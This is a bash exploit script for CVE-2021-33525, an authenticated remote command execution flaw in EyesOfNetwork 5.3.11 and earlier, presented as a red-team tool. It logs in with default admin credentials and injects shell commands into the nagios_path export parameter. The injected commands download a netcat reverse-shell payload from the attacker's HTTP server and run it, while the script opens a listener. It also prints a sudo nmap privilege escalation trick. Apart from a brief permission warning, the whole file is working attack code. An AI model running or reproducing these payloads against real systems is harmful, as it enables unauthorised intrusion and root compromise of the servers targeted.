#!/bin/bash

#LocalHost VAR
LHOST=192.168.0.40
LPORT=9090

#RemoteHost VAR
RHOST=172.16.71.130
LOGIN=admin
PASSWORD=admin

###############################################
#              (Authentified)                 #
#         Remote Commande Execution           #
#              CVE-2021-33525                 #
#                                             #
#      Impacted version * =/>  5.3.11         #
#               ...........                   #
#                                             #
#         Scripted on 05/22/2021              #
#              By ArianeBlow                  #
#                                             #
###############################################



banner()
{
echo "                 ,*-."
echo '                 |  |'
echo '             ,.  |  |'
echo '             | |_|  | ,.'
echo '             `---.  |_| |'
echo '                 |  .--`'
echo "                 |  |"
echo "                 |  |"
echo ""
echo " ! DO NOT USE IF YOU DONT HAVE PERSMISSION !"
echo ""
echo "       EyesOfNetwork = / > 5.3.11"
echo ""
echo "            RedTeam Tool"
echo ""
echo "     Input verification desertion"
echo ""
echo "      Remote Commande Injection"
echo ""
echo ""
echo ""
}
banner

rm http.sh
rm listen.sh
rm payload.sh


#Start http server & create payload
touch payload.sh
echo "#!/bin/bash" > payload.sh
echo "nc -e /bin/bash $LHOST $LPORT" >> payload.sh


echo "gnome-terminal -e 'python3 -m http.server 9999'" >> http.sh
chmod +x http.sh
./http.sh

#Get AUTH Cookie
echo ""
echo "[-] Getting cookie ..." 
echo ""
echo ""
curl -i -s -k -X $'POST' \
    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 21' -H $"Origin: https://$RHOST" -H $'Connection: close' -H $"Referer: https://$RHOST/login.php" -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=' \
    --data-binary $"login=$LOGIN&mdp=$PASSWORD" \
    $"https://$RHOST/login.php" >> /tmp/logSploit.dat 
COOKIE=$(cat /tmp/logSploit.dat | grep session_id= | cut -d "=" -f 2 | cut -d ";" -f 1)
echo "[+] sessions_id & PHPESSID greped for futher requests = $COOKIE"
echo ""
echo ""

#BLANK Job ID 2 for cleaning the remote temporary directory
curl -i -s -k -X $'GET' \
    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
    $"https://$RHOST/lilac/export.php?id=2&delete=2" >> /tmp/logSploit.dat

#Start Listener
echo "[+] Powned"
printf "\e[31;1m When the Reverse-Shell is etablished, you can PrivEsc with :\e[0m \n"
echo "echo 'os.execute("/bin/sh")' > /tmp/nmap.script"
echo "sudo nmap --script=/tmp/nmap.script"
echo ""
printf "\e[31;1m ... I Know ... \e[0m \n"
echo ""
echo "gnome-terminal -e 'nc -lnvp $LPORT'" >> listen.sh
chmod +x listen.sh
./listen.sh

#sending payload
# /srv/eyesofnetwork/nagios/bin/nagios -v /tmp/lilac-export-33/nagios.cfg && curl http://192.168.0.40:9999/test.sh -o /tmp/lilac-export-2/test.sh && chmod +x /tmp/lilac-export-2/test.sh && cd /tmp/lilac-export-2/ && ./test.sh && ./test.sh

curl -i -s -k -X $'POST' \
    -H $"Host: $RHOST" -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 431' -H $"Origin: https://$RHOST" -H $'Connection: close' -H $"Referer: https://$RHOST/lilac/export.php" -H $'Upgrade-Insecure-Requests: 1' \
    -b $"PHPSESSID=$COOKIE; session_id=$COOKIE; user_name=$LOGIN; user_id=1; user_limitation=0; group_id=1" \
    --data-binary $"request=export&job_name=az&job_description=az&job_engine=NagiosExportEngine&preflight_check=on&restart_nagios=on&nagios_path=%2Fsrv%2Feyesofnetwork%2Fnagios%2Fbin%2Fnagios+-v+%2Ftmp%2Flilac-export-2%2Fnagios.cfg+%26%26+curl+http%3A%2F%2F$LHOST%3A9999%2Fpayload.sh+-o+%2Ftmp%2Flilac-export-2%2Fpayload.sh+%26%26+chmod+%2Bx+%2Ftmp%2Flilac-export-2%2Fpayload.sh+%26%26+cd+%2Ftmp%2Flilac-export-2%2F+%26%26+.%2Fpayload.sh+%26%26+.%2Fpayload.sh" \
    $"https://$RHOST/lilac/export.php" >> /tmp/logSploit.dat

#CLEAN
rm /tmp/logSploit.dat
echo ""
echo ""
echo "Exploit log in /tmp/log.dat"
echo ""
echo ""
